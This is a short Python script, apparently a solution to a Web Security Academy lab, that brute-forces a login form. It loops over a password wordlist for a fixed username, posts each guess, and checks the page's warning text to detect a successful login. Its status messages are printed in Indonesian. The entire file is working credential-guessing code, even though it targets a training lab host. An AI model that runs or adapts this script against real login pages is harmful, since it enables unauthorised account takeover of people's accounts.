import requests
from bs4 import BeautifulSoup

url = "https://0a4800f3030d9107c0fcec6600b20069.web-security-academy.net/login"
#userpas = open("userpas.txt","r").readlines()
password = open("password.txt","r").readlines()
username = "albuquerque"

for pas in password:
	pas = pas.replace("\n","")
	data = f"username={username}&password={pas}"
	response = requests.post(url,data=data)
	print(data)

	soup = str(BeautifulSoup(response.text, 'html.parser').find('p', class_='is-warning').get_text().strip())
	print(soup)

	if("Invalid" in soup):
		print(f"gagal password {pas}")
	else:
		print(f"ketemu pass nya username{username} password {pas}")
		break